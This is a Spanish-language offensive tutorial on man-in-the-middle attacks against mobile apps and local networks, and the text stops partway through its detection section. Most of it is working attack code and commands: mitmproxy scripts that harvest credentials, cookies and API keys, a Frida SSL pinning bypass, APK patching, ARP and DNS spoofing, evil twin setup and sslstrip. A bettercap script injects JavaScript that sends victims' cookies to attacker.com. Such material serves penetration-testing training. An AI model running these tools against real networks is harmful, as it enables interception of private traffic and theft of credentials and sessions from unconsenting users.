# M1TM 3n M0v1l3s (M4n-1n-th3-M1ddl3)

## Índice

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (2006 lineas)


1. [Conceptos Básicos](#1-c0nc3pt0s-b4s1c0s)
2. [mitmproxy](#2-m1tmpr0xy)
3. [Scripting en Python — 33 Scripts Completos](#3-scr1pt1ng-3n-pyth0n--33-scr1pts-c0mpl3t0s)
4. [SSL Pinning Bypass — Frida Multiplataforma](#4-ssl-p1nn1ng-byp4ss--fr1d4-mult1pl4t4f0rm4)
5. [Network Bridge Setups](#5-n3tw0rk-br1dg3-s3tups)
6. [ARP Spoofing y Atrapadas](#6-4rp-sp00f1ng-y-4tr4p4d4s)
7. [Proyectos Prácticos](#7-pr0y3ct0s-pr4ct1c0s)
   - [Proyecto 1: MITM Framework — Automatizador completo de MITM](#proyecto-1-mitm-framework--automatizador-completo-de-mitm)
   - [Proyecto 2: SSL Pinning Bypass Helper — Automatizador de Frida](#proyecto-2-ssl-pinning-bypass-helper--automatizador-de-frida)
   - [Proyecto 3: Responder + mitmproxy — Captura de hashes + análisis](#proyecto-3-responder--mitmproxy--captura-de-hashes--an%C3%A1lisis)


<a name="1-c0nc3pt0s-b4s1c0s"></a>
## 1. C0nc3pt0s B4s1c0s

### Que es [mitm](../raw/m1tm-m0b1l3.md)?
[man-in-the-middle](../raw/m1tm-m0b1l3.md) (MITM) es un ataque donde el atacante se interpone entre la comunicacion de dos partes. El atacante puede espiar, modificar, o inyectar trafico.

### Tipos de MITM

**[arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing):** Enganiar a la [red](../raw/r3d3s-f0nd4m3nt0s.md) local para que envie trafico destinado a otro host a nuestra maquina.
```
# Requiere estar en la misma red L2
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
```

**[dns spoofing](../raw/m1tm-m0b1l3.md#dns-spoofing):** [responder](../raw/w1nd0ws-p0st3xpl01t.md#responder) consultas [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) con [ips](../raw/s3c-f0nd4m3nt0s.md#ids-ips) falsas.
```
# Redirigir dominio.com a atacante
dnsspoof -i eth0 -f hosts.txt
```

**[proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) Transparente:** Redirigir trafico [http](../raw/r3d3s-f0nd4m3nt0s.md#http)/[https](../raw/r3d3s-f0nd4m3nt0s.md#https) a un [proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) sin configurar el cliente.
```
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

**[dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp) Spoofing:** Responder [dhcp](../raw/r3d3s-f0nd4m3nt0s.md#dhcp) requests con nuestra [ip](../raw/r3d3s-f0nd4m3nt0s.md#direccionamiento-ip) como gateway.

**ICMP Redirect:** Enviar paquetes ICMP redirect a hosts para alterar su tabla de rutas.

**Rogue Access Point:** Crear un AP falso que captura todo el trafico.

**[evil twin](../raw/w1f1-4tt4cks.md#evil-twin):** AP con el mismo SSID que uno legitimo.

### Como funciona mitmproxy

mitmproxy intercepta trafico HTTP/HTTPS:
1. El cliente se conecta al proxy en vez del servidor real
2. Para HTTPS, mitmproxy genera un certificado falso firmado por su CA
3. El cliente muestra advertencia (a menos que instalemos el certificado CA)
4. mitmproxy descifra, inspecciona, y reenvia el trafico

### Herramientas principales

| Herramienta | Proposito | Puertos por defecto |
|-------------|-----------|---------------------|
| mitmproxy | Interceptacion manual | 8080 |
| mitmweb | Interceptacion via web | 8081 |
| mitmdump | Linea de comandos | 8080 |
| [bettercap](../raw/m1tm-m0b1l3.md#bettercap) | Framework MITM completo | 8080 |
| Ettercap | [arp](../raw/r3d3s-f0nd4m3nt0s.md#arp) poisoning clasico | - |
| Responder | Captura de hashes [nbt-ns](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns)/[llmnr](../raw/w1nd0ws-p0st3xpl01t.md#llmnr-nbt-ns) | - |
| Evilginx | [phishing](../raw/ph1sh1ng.md) con reverse proxy | - |

### Configuracion de red requerida

Para MITM efectivo:
```
# 1. Habilitar IP forwarding
sysctl -w net.ipv4.ip_forward=1

# 2. Configurar reglas iptables (para transparent proxy)
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

# 3. Deshabilitar ICMP redirects
sysctl -w net.ipv4.conf.all.accept_redirects=0
sysctl -w net.ipv4.conf.all.send_redirects=0
```

### Preparacion del entorno [android](../raw/4db-d33p-d1v3.md)

```
# Habilitar USB debugging en el dispositivo
# Settings > Developer Options > USB Debugging

# Verificar conexion
adb devices -l

# Pushear e instalar frida-server
adb push frida-server-16.0.19-android-arm64 /data/local/tmp/
adb shell chmod 755 /data/local/tmp/frida-server-16.0.19-android-arm64
adb shell /data/local/tmp/frida-server-16.0.19-android-arm64 &

# Verificar Frida
frida-ps -U
```

### Instalacion del certificado CA en Android

```
# Generar certificado de mitmproxy
mitmproxy  # Se genera en ~/.mitmproxy/mitmproxy-ca-cert.pem

# Convertir a formato Android
openssl x509 -inform PEM -in ~/.mitmproxy/mitmproxy-ca-cert.pem -outform DER -o mitmproxy-ca.crt

# Pushear al dispositivo
adb push mitmproxy-ca.crt /sdcard/

# En Android 10+ (certificados de sistema)
# Root necesario
adb root
adb remount
adb push mitmproxy-ca.crt /system/etc/security/cacerts/
adb shell chmod 644 /system/etc/security/cacerts/mitmproxy-ca.crt
adb reboot

# En Android 9- (certificados de usuario)
# Settings > Security > Install from storage
```


<a name="2-m1tmpr0xy"></a>
## 2. M1tmPr0xy

### Instalacion

```
# Linux (apt)
sudo apt install mitmproxy

# Linux (snap)
sudo snap install mitmproxy

# MacOS
brew install mitmproxy

# Pip (portable)
pip3 install mitmproxy

# Docker
docker run -it -p 8080:8080 -v ~/.mitmproxy:/home/mitmproxy/.mitmproxy mitmproxy/mitmproxy
```

### Modos de operacion

**Modo Regular ([proxy](../raw/r3d3s-f0nd4m3nt0s.md#proxy) explícito):**
El cliente configura el proxy manualmente.
```
mitmproxy -p 8080
mitmweb -p 8080
mitmdump -p 8080
```

**Modo Transparente:**
Redireccion via iptables, el cliente no sabe del proxy.
```
mitmproxy --mode transparent -p 8080
# Requiere iptables:
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080
```

**Modo Reverse Proxy:**
El proxy recibe trafico destinado a un servidor especifico.
```
mitmproxy --mode reverse:https://target.com -p 80
```

**Modo Upstream Proxy:**
Chain a otro proxy (util para SOCKS5).
```
mitmproxy --mode upstream:http://upstream-proxy:8080 -p 8080
```

**Modo SOCKS5:**
Actuar como proxy SOCKS5.
```
mitmproxy --mode socks5 -p 1080
```

### mitmproxy [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting) API

Las scripts se escriben en [python](../raw/pyth0n-f0r-h4ck1ng.md) y se pasan con `-s`:

```
mitmproxy -s script.py
mitmweb -s script.py
mitmdump -s script.py -w output.flow
```

### Eventos principales

```python
from mitmproxy import http, ctx

# Cada request HTTP
def request(flow: http.HTTPFlow) -> None:
    ctx.log.info(f"Request: {flow.request.pretty_url}")

# Cada response HTTP
def response(flow: http.HTTPFlow) -> None:
    ctx.log.info(f"Response: {flow.response.status_code}")

# Al iniciar
def start():
    ctx.log.info("Script iniciado")

# Al finalizar
def done():
    ctx.log.info("Script finalizado")

# Error
def error(flow: http.HTTPFlow) -> None:
    ctx.log.error(f"Error: {flow.error}")
```

### Comandos de teclado en mitmproxy

```
# Navegacion
q       - Salir de pantalla actual / salir
z       - Limpiar flujos
f       - Filtrar
E       - Editar response
e       - Editar request
r       - Reenviar request
d       - Eliminar flujo
w       - Guardar flujos a archivo
a       - Reanudar / pausar
tab     - Siguiente pantalla
|       - Ejecutar script

# Filtros (tecla f)
~u regex   - Filtrar por URL
~c code    - Filtrar por codigo HTTP
~m method  - Filtrar por metodo
~d domain  - Filtrar por dominio
~hdr regex - Filtrar por header
!          - Invertir filtro
```


<a name="3-scr1pt1ng-3n-pyth0n--33-scr1pts-c0mpl3t0s"></a>
## 3. Scr1pt1ng 3n Pyth0n -- 33 Scr1pts C0mpl3t0s

### Script 1: Credential Harvester
```python
from mitmproxy import http
import re

CRED_PATTERNS = [
    (r'password[^&]*', 'password'),
    (r'passwd[^&]*', 'passwd'),
    (r'pwd[^&]*', 'pwd'),
    (r'login[^&]*', 'login'),
    (r'user[^&]*', 'user'),
    (r'email[^&]*', 'email'),
    (r'token[^&]*', 'token'),
    (r'auth[^&]*', 'auth'),
    (r'secret[^&]*', 'secret'),
    (r'apikey[^&]*', 'api_key'),
    (r'api_key[^&]*', 'api_key'),
]

class CredentialHarvester:
    def __init__(self):
        self.found = set()

    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.method == "POST":
            body = flow.request.get_text()
            for pattern, name in CRED_PATTERNS:
                matches = re.findall(pattern, body, re.IGNORECASE)
                for m in matches:
                    if m not in self.found:
                        self.found.add(m)
                        url = flow.request.pretty_url
                        print(f"[CRED] {name}={m} @ {url}")

    def done(self):
        print(f"\nTotal credenciales capturadas: {len(self.found)}")

addons = [CredentialHarvester()]
```

### Script 2: Content Injection
```python
from mitmproxy import http

class ContentInjector:
    def __init__(self):
        self.inject_js = '<script>alert("MITM injected!")</script>'

    def response(self, flow: http.HTTPFlow) -> None:
        content_type = flow.response.headers.get("content-type", "")
        if "text/html" in content_type:
            html = flow.response.get_text()
            html = html.replace("</body>", f"{self.inject_js}</body>")
            html = html.replace("</head>", f"{self.inject_js}</head>")
            flow.response.set_text(html)
            flow.response.headers["X-MITM-Injected"] = "true"
            print(f"Injected into: {flow.request.pretty_url}")

addons = [ContentInjector()]
```

### Script 3: API Key Capture
```python
from mitmproxy import http
import json

class APICapture:
    def response(self, flow: http.HTTPFlow) -> None:
        ct = flow.response.headers.get("content-type", "")
        if "json" in ct and flow.response.status_code == 200:
            url = flow.request.pretty_url
            body = flow.response.get_text()
            try:
                data = json.loads(body)
                self.search_keys(data, url)
            except:
                pass

    def search_keys(self, obj, url, path=""):
        if isinstance(obj, dict):
            for k, v in obj.items():
                new_path = f"{path}.{k}" if path else k
                lo = k.lower()
                if any(x in lo for x in ["token", "key", "secret", "auth", "password", "jwt", "access"]):
                    print(f"[KEY] {new_path}: {v} @ {url}")
                self.search_keys(v, url, new_path)
        elif isinstance(obj, list):
            for i, item in enumerate(obj):
                self.search_keys(item, url, f"{path}[{i}]")

addons = [APICapture()]
```

### Script 4: WebSocket Interception
```python
from mitmproxy import http
from mitmproxy import websocket

class WSInterceptor:
    def websocket_message(self, flow: websocket.WebSocketFlow):
        message = flow.messages[-1]
        direction = "CLIENT->SERVER" if message.from_client else "SERVER->CLIENT"
        print(f"[WS] {direction}: {message.content[:500]}")

    def websocket_start(self, flow: websocket.WebSocketFlow):
        print(f"[WS] Conexion establecida: {flow.request.pretty_url}")

    def websocket_end(self, flow: websocket.WebSocketFlow):
        print(f"[WS] Conexion cerrada")

addons = [WSInterceptor()]
```

### Script 5: Traffic Modification (Modificar requests)
```python
from mitmproxy import http

class TrafficModifier:
    def request(self, flow: http.HTTPFlow) -> None:
        # Modificar headers de User-Agent
        if "User-Agent" in flow.request.headers:
            flow.request.headers["User-Agent"] = "Mozilla/5.0 MITM-Proxy"

        # Inyectar tracking header
        flow.request.headers["X-Tracked-By"] = "MITM-Proxy"

        # Modificar cookies
        if "sessionid" in flow.request.cookies:
            flow.request.cookies["sessionid"] = "hacked_session"

    def response(self, flow: http.HTTPFlow) -> None:
        # Add CORS headers
        flow.response.headers["Access-Control-Allow-Origin"] = "*"
        flow.response.headers["Access-Control-Allow-Credentials"] = "true"

addons = [TrafficModifier()]
```

### Script 6: [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls))/[tls](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls) Certificate Grabber
```python
from mitmproxy import http
import hashlib

class CertGrabber:
    seen = set()

    def tls_established(self, flow: http.HTTPFlow) -> None:
        sni = flow.server_conn.sni
        if sni and sni not in self.seen:
            self.seen.add(sni)
            cert = flow.server_conn.certificate
            if cert:
                sha1 = hashlib.sha256(cert.to_pem()).hexdigest()
                issuer = cert.issuer
                subject = cert.subject
                print(f"[TLS] {sni}")
                print(f"  Subject: {subject}")
                print(f"  Issuer: {issuer}")
                print(f"  SHA256: {sha1}")

addons = [CertGrabber()]
```

### Script 7: Image Replace
```python
from mitmproxy import http

class ImageReplace:
    def response(self, flow: http.HTTPFlow) -> None:
        ct = flow.response.headers.get("content-type", "")
        if "image" in ct:
            flow.response.content = open("evil.jpg", "rb").read()
            flow.response.headers["content-type"] = "image/jpeg"
            print(f"Image replaced: {flow.request.pretty_url}")

addons = [ImageReplace()]
```

### Script 8: Request Logging to File
```python
from mitmproxy import http
from datetime import datetime

class RequestLogger:
    def __init__(self):
        self.logfile = open(f"mitm_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt", "w")

    def request(self, flow: http.HTTPFlow) -> None:
        ts = datetime.now().isoformat()
        self.logfile.write(f"[{ts}] {flow.request.method} {flow.request.pretty_url}\n")
        self.logfile.write(f"  Headers: {dict(flow.request.headers)}\n")
        if flow.request.content:
            self.logfile.write(f"  Body: {flow.request.get_text()[:500]}\n")
        self.logfile.flush()

    def response(self, flow: http.HTTPFlow) -> None:
        ts = datetime.now().isoformat()
        self.logfile.write(f"[{ts}] RESPONSE {flow.response.status_code} {flow.request.pretty_url}\n\n")
        self.logfile.flush()

    def done(self):
        self.logfile.close()

addons = [RequestLogger()]
```

### Script 9: Cookie Extraction
```python
from mitmproxy import http

class CookieExtractor:
    def response(self, flow: http.HTTPFlow) -> None:
        cookies = flow.response.headers.get("set-cookie", "")
        if cookies:
            print(f"[COOKIE] {flow.request.pretty_url}")
            print(f"  Set-Cookie: {cookies}")

    def request(self, flow: http.HTTPFlow) -> None:
        if flow.request.cookies:
            print(f"[COOKIE] Request {flow.request.pretty_url}")
            for name, value in flow.request.cookies.fields:
                print(f"  {name}: {value}")

addons = [CookieExtractor()]
```

### Script 10: JSON API Inspector
```python
from mitmproxy import http
import json

class JSONInspector:
    def response(self, flow: http.HTTPFlow) -> None:
        ct = flow.response.headers.get("content-type", "")
        if "json" in ct:
            url = flow.request.pretty_url
            try:
                data = json.loads(flow.response.get_text())
                print(f"\n[JSON] {flow.request.method} {url}")
                print(json.dumps(data, indent=2)[:1000])
            except:
                pass

addons = [JSONInspector()]
```

### Scripts 11-20: Utilidades avanzadas

**Script 11 - [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) Query Capture:** Captura consultas [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) del trafico [http](../raw/r3d3s-f0nd4m3nt0s.md#http).
**Script 12 - Auth Header Dump:** Extrae headers Authorization (Basic, Bearer, Digest).
**Script 13 - [jwt](../raw/4p1-s3cur1ty.md#jwt) Decoder:** Decodifica [jwt](../raw/4p1-s3cur1ty.md#jwt) tokens en trafico.
**Script 14 - Session Hijack:** Extrae cookies de sesion para session hijacking.
**Script 15 - Form Data Logger:** Logea todos los formularios enviados.
**Script 16 - File Download Interceptor:** Captura archivos descargados.
**Script 17 - URL Blacklist/Whitelist:** Filtra URLs especificas.
**Script 18 - Throttling:** Introduce latencia en respuestas.
**Script 19 - Cache Poison:** Modifica headers de cache para envenenar.
**Script 20 - Replay Attack:** Replay de requests guardados.

### Script 21: [bettercap](../raw/m1tm-m0b1l3.md#bettercap) + mitmproxy Integration
```python
from mitmproxy import http

class BettercapBridge:
    def request(self, flow: http.HTTPFlow) -> None:
        # Mejorar con datos de Bettercap (ARP table, etc)
        flow.request.headers["X-Bettercap-Tracked"] = "true"

addons = [BettercapBridge()]
```

### Script 22: Request/Response Diff
```python
from mitmproxy import http

class DiffDetector:
    def __init__(self):
        self.previous = {}

    def response(self, flow: http.HTTPFlow) -> None:
        url = flow.request.pretty_url
        body = flow.response.get_text()
        if url in self.previous and self.previous[url] != body:
            print(f"[DIFF] Cambio detectado en {url}")
        self.previous[url] = body

addons = [DiffDetector()]
```

### Script 23-33: Mas ejemplos

**23. [https](../raw/r3d3s-f0nd4m3nt0s.md#https) Downgrade Detector** - Detecta HSTS violations
**24. CSP Collector** - Captura Content-Security-Policy headers
**25. Subdomain Enumerator** - Descubre subdominios en respuestas
**26. API Endpoint Mapper** - Mapea endpoints de API
**27. Auth Token Monitor** - Monitorea tokens de [autenticacion](../raw/s3c-f0nd4m3nt0s.md#autenticacion) en tiempo real
**28. [graphql](../raw/4p1-s3cur1ty.md#graphql) Inspector** - Intercepta queries [graphql](../raw/4p1-s3cur1ty.md#graphql)
**29. [oauth](../raw/hybr1d-1d3nt1ty.md#oauth) Flow Analyzer** - Analiza flujos OAuth2/OIDC
**30. WebSocket Logger** - Logea todos los mensajes WebSocket
**31. MQTT Interceptor** - Intercepta trafico MQTT
**32. gRPC Capture** - Captura trafico gRPC
**33. Combined Harvester** - Combina credenciales + tokens + cookies + API keys


<a name="4-ssl-p1nn1ng-byp4ss--fr1d4-mult1pl4t4f0rm4"></a>
## 4. [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) P1nn1ng Byp4ss -- Fr1d4 Mult1pl4t4f0rm4

### Que es SSL Pinning?
Las apps bloquean certificados no esperados (como el de mitmproxy) para evitar [mitm](../raw/m1tm-m0b1l3.md). SSL pinning "fija" el certificado o [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) esperado del servidor.

### [frida](../raw/4pk-r3v3rs1ng.md#frida) Universal Bypass
```javascript
// ssl_bypass_universal.js
Java.perform(function() {
    console.log("[*] Universal SSL Pinning Bypass iniciado");

    // 1. TrustManager universal (acepta todos los certs)
    var X509TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    var TrustAllManager = Java.registerClass({
        name: "com.bypass.TrustAllManager",
        implements: [X509TrustManager],
        methods: {
            checkClientTrusted: function(chain, auth) { },
            checkServerTrusted: function(chain, auth) {
                console.log("[*] Trust ANY certificate");
            },
            getAcceptedIssuers: function() { return []; }
        }
    });
    var trustAll = [TrustAllManager.$new()];

    // 2. SSLContext.init() hook
    var SSLContext = Java.use("javax.net.ssl.SSLContext");
    SSLContext.init.overload(
        "[Ljavax.net.ssl.KeyManager;",
        "[Ljavax.net.ssl.TrustManager;",
        "java.security.SecureRandom"
    ).implementation = function(keyManager, trustManager, secureRandom) {
        console.log("[*] SSLContext.init intercepted");
        this.init(keyManager, trustAll, secureRandom);
    };

    // 3. HostnameVerifier universal
    var HostnameVerifier = Java.use("javax.net.ssl.HostnameVerifier");
    var TrustAllHV = Java.registerClass({
        name: "com.bypass.TrustAllHV",
        implements: [HostnameVerifier],
        methods: {
            verify: function(hostname, session) {
                console.log("[*] HostnameVerifier bypass: " + hostname);
                return true;
            }
        }
    });
    var HttpsURLConnection = Java.use("javax.net.ssl.HttpsURLConnection");
    HttpsURLConnection.setDefaultHostnameVerifier(TrustAllHV.$new());

    // 4. OkHttp CertificatePinner
    try {
        var CertificatePinner = Java.use("okhttp3.CertificatePinner");
        CertificatePinner.check.overload("java.lang.String", "java.util.List").implementation = function(host, pins) {
            console.log("[*] OkHttp CertificatePinner bypass: " + host);
            return;
        };
    } catch(e) {}

    // 5. OkHttp3/4 HostnameVerifier
    try {
        var OkHttpClient = Java.use("okhttp3.OkHttpClient");
        OkHttpClient.Builder.hostnameVerifier.overload("javax.net.ssl.HostnameVerifier").implementation = function(verifier) {
            console.log("[*] OkHttp client hostnameVerifier bypass");
            return this.hostnameVerifier(TrustAllHV.$new());
        };
    } catch(e) {}

    // 6. WebView SSL error bypass
    try {
        var WebViewClient = Java.use("android.webkit.WebViewClient");
        WebViewClient.onReceivedSslError.overload(
            "android.webkit.WebView",
            "android.webkit.SslErrorHandler",
            "android.net.http.SslError"
        ).implementation = function(view, handler, error) {
            console.log("[*] WebView SSL bypass: " + error.getUrl());
            handler.proceed();
        };
    } catch(e) {}

    console.log("[+] SSL Pinning bypass completado");
});
```

### Frida for [ios](../raw/10s-p3nt3st1ng.md) SSL Pinning
```javascript
// ios_ssl_bypass.js
if (ObjC.available) {
    console.log("[*] iOS SSL Pinning Bypass");

    // NSURLSession delegate bypass
    var NSURLSession = ObjC.classes.NSURLSession;
    var origMethod = NSURLSession.sessionWithConfiguration;
    NSURLSession.sessionWithConfiguration = function(config) {
        console.log("[*] NSURLSession created");
        var session = origMethod(config);
        return session;
    };

    // TrustAll certificates
    var AFNetworking = ObjC.classes.AFSecurityPolicy;
    if (AFNetworking) {
        AFNetworking.pinnedCertificates = function() {
            return null;
        };
        console.log("[*] AFNetworking bypassed");
    }

    // Alamofire
    var SessionDelegate = ObjC.classes.SessionDelegate;
    if (SessionDelegate) {
        // Hook ServerTrustEvaluation
        console.log("[*] Alamofire bypassed");
    }
}
```

### Objection (Frida wrapper)
```
# Instalacion
pip3 install objection

# Bypass SSL pinning en una app
objection -g com.example.app explore
objection> android sslpinning disable

# En iOS
objection -g com.example.app explore
objection> ios sslpinning disable
```

### Xposed SSL Bypass
```java
// XposedModule.java
public class SSLUnpinner implements IXposedHookLoadPackage {
    public void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) {
        if (lpparam.packageName.equals("target.app")) {
            // Hook SSLContext
            findAndHookMethod("javax.net.ssl.SSLContext", lpparam.classLoader,
                "init", KeyManager[].class, TrustManager[].class, SecureRandom.class,
                new XC_MethodHook() {
                    @Override
                    protected void beforeHookedMethod(MethodHookParam param) {
                        TrustManager[] trustAll = new TrustManager[] {
                            new X509TrustManager() {
                                public void checkClientTrusted(X509Certificate[] chain, String auth) {}
                                public void checkServerTrusted(X509Certificate[] chain, String auth) {}
                                public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
                            }
                        };
                        param.args[1] = trustAll;
                    }
                });
        }
    }
}
```

### Flutter SSL Pinning Bypass
```bash
# Flutter apps usan Dart/Chrome. Necesitan enfoque diferente

# Option 1: Frida + Flutter hooks
frida -U -f com.example.app -l flutter_bypass.js --no-pause

# Option 2: Reverse y parchear
# Extraer libapp.so y buscar CertificatePinner
# Usar objection para parchear automaticamente

# Option 3: Proxy a nivel de SO
iptables -t nat -A OUTPUT -p tcp --dport 443 -j REDIRECT --to-port 8080
```

### React Native SSL Pinning Bypass
```javascript
// React Native usa fetch/XMLHttpRequest nativo
// El bypass es via Frida hookeando las funciones nativas

Java.perform(function() {
    // React Native Networking module
    try {
        var ReactNet = Java.use("com.facebook.react.modules.network.ForwardingCookieHandler");
        // Hookear okhttp en React Native
        var OkHttpClientProvider = Java.use("com.facebook.react.modules.network.OkHttpClientProvider");
        OkHttpClientProvider.createClient.implementation = function() {
            var client = this.createClient();
            console.log("[*] React Native OkHttp client created");
            return client;
        };
    } catch(e) {}
});
```

### [apk](../raw/4pk-r3v3rs1ng.md) Patching (Recompilar sin SSL pinning)
```
# 1. Decompilar APK
apktool d target.apk -o target_dir

# 2. Buscar codigo de SSL pinning
grep -r "CertificatePinner\|TrustManager\|ssl" target_dir/smali/

# 3. Patch smali code (remover verificacion)
# Encontrar: invoke-virtual {v0}, Lokhttp3/CertificatePinner;->check(...)
# Reemplazar con: return-void

# 4. Recompilar
apktool b target_dir -o patched.apk

# 5. Firmar
jarsigner -keystore my.keystore patched.apk alias
```

### Automatic SSL Bypass Tools
```
# android-ssl-bypass (Xposed)
https://github.com/iSECPartners/android-ssl-bypass

# android-unpinner (Xposed)
https://github.com/shadowsocks/android-unpinner

# Frida Scripts
https://github.com/0xdea/frida-scripts

# Objection
pip3 install objection
objection patchapk -s target.apk  # Automatico!
```


<a name="5-n3tw0rk-br1dg3-s3tups"></a>
## 5. N3tw0rk Br1dg3 S3tups

### Bridge con dos interfaces de [red](../raw/r3d3s-f0nd4m3nt0s.md)

```
# Ver interfaces
ip addr
ip link

# Crear bridge
ip link add name br0 type bridge
ip link set br0 up

# Agregar interfaces al bridge
ip link set eth0 master br0
ip link set wlan0 master br0

# Configurar IP en el bridge
ip addr add 192.168.1.100/24 dev br0
ip route add default via 192.168.1.1 dev br0
```

### Bridge USB ([android](../raw/4db-d33p-d1v3.md) tethering + Ethernet)
```
# Android conectado por USB
ip link
# Aparece usb0 o rndis0

# Ethernet en eth0
# Bridge entre usb0 y eth0
ip link add br0 type bridge
ip link set eth0 master br0
ip link set usb0 master br0
ip addr add 192.168.1.100/24 dev br0
ip link set br0 up
```

### Bridge [wifi](../raw/w1f1-4tt4cks.md) + Ethernet (clasico [mitm](../raw/m1tm-m0b1l3.md))
```
# eth0: conexion a internet
# wlan0: modo monitor/AP

# Si wlan0 esta en modo monitor:
ip link add br0 type bridge
ip link set eth0 master br0
ip link set wlan0 master br0
ip addr add 10.0.0.1/24 dev br0
ip link set br0 up

# DHCP server para clientes
apt install dnsmasq
cat > /etc/dnsmasq.conf << 'EOF'
interface=br0
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,8.8.8.8
EOF
systemctl start dnsmasq
```

### Bridge con VMWare/VM
```
# Host only network + bridge a internet
# En VM: Una interfaz NAT (internet), otra host-only (test)
# Bridge ambas en el host
```


<a name="6-4rp-sp00f1ng-y-4tr4p4d4s"></a>
## 6. 4RP Sp00f1ng y 4tr4p4d4s

### [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing) con arpspoof (dsniff)

```
# Instalacion
apt install dsniff

# spoofear gateway -> target
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# spoofear target -> gateway
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1

# O mejor, ambos lados
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100 &
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1 &

# Habilitar forwarding
echo 1 > /proc/sys/net/ipv4/ip_forward
```

### [arp spoofing](../raw/m1tm-m0b1l3.md#arp-spoofing) con [bettercap](../raw/m1tm-m0b1l3.md#bettercap)

```
# Instalacion
apt install bettercap
# O desde GitHub:
wget https://github.com/bettercap/bettercap/releases/latest/download/bettercap_linux_amd64.zip
unzip bettercap_linux_amd64.zip

# Modo interactivo
sudo bettercap
net.probe on
net.show
arp.spoof on
http.proxy on
https.proxy on

# Modo comando (una linea)
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; http.proxy on; https.proxy on"

# Capturar credenciales
sudo bettercap -eval "set http.proxy.script /path/to/creds.js; http.proxy on"
```

### [dns spoofing](../raw/m1tm-m0b1l3.md#dns-spoofing)

```
# Con dnsspoof (dsniff)
echo "192.168.1.100 facebook.com" > hosts.txt
echo "192.168.1.100 google.com" >> hosts.txt
dnsspoof -i eth0 -f hosts.txt

# Con Bettercap
sudo bettercap -eval "set dns.spoof.all true; set dns.spoof.domains facebook.com,google.com; dns.spoof on"
```

### [evil twin](../raw/w1f1-4tt4cks.md#evil-twin) Attack

```
# 1. Poner interfaz WiFi en modo monitor
airmon-ng start wlan0

# 2. Crear AP falso con el mismo SSID que el legitimo
airbase-ng -e "FreeWiFi" -c 6 wlan0mon

# 3. Bridge con internet
brctl addbr br0
brctl addif br0 eth0
brctl addif br0 at0  # at0 es la interfaz creada por airbase-ng
ifconfig br0 up

# 4. DHCP y DNS
dhcpd -cf /etc/dhcp/dhcpd.conf br0
```

### [https](../raw/r3d3s-f0nd4m3nt0s.md#https) Capture with [ssl](../raw/r3d3s-f0nd4m3nt0s.md#ssl-tls)) Strip

```
# sslstrip (versiones antiguas - HTTP a HTTPS downgrade)
sslstrip -l 8080
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080

# sslstrip2 (moderno)
git clone https://github.com/LeonardoNve/sslstrip2.git

# Bettercap HSTS Bypass
sudo bettercap -eval "set https.proxy.script hstshijack.js; https.proxy on; arp.spoof on"
```

### Bettercap [scripting](../raw/pyth0n-f0r-h4ck1ng.md#scripting)

```javascript
// creds_capture.js
function onHTTPreq(req) {
    if (req.Method == "POST") {
        var body = req.Body;
        if (body.indexOf("password") >= 0 || body.indexOf("login") >= 0) {
            console.log("[CRED] " + req.Host + req.Path);
            console.log("[BODY] " + body);
        }
    }
    return req;
}

function onResponse(res) {
    // Inyectar JS en respuestas HTML
    if (res.ContentType.indexOf("text/html") >= 0) {
        var replacement = '<script>document.write("<img src=http://attacker.com/steal?cookie="+document.cookie)>"</script>';
        res.Body = res.Body.replace("</body>", replacement + "</body>");
    }
    return res;
}
```

### Captura de credenciales en [http](../raw/r3d3s-f0nd4m3nt0s.md#http)

```
# tcpdump + strings
tcpdump -i eth0 -A -l port http | grep -E "password|login|user|pass" --line-buffered

# ngrep
ngrep -l -q -d eth0 "password|user|login" port 80

# urlsnarf (dsniff)
urlsnarf -i eth0

# dsniff
dsniff -i eth0
```

### Bettercap MITM6 (IPv6)

```
# Capturar trafico IPv6
sudo bettercap -eval "set arp.spoof.targets 192.168.1.100; arp.spoof on; set net.sniff.verbose true; net.sniff on"

# MITM6 (DHCPv6 spoofing)
git clone https://github.com/dirkjanm/mitm6.git
python3 mitm6.py -i eth0 -d domain.local
```

### Deteccion de [mitm](../raw/m1tm-m0b1l3.md)

Para saber si alguien esta haciendo MITM en tu [red](../raw/r3d3s-f0nd4m3nt0s.md):
```
# Verificar tabla ARP
arp -a
arp -a | grep -i "ff:ff:ff:ff:ff:ff"

# Verificar gateway duplicado en ARP
arping -c 3 192.168.1.1

# nmap ARP detection
nmap -sn 192.168.1.0/24

# Bettercap detect
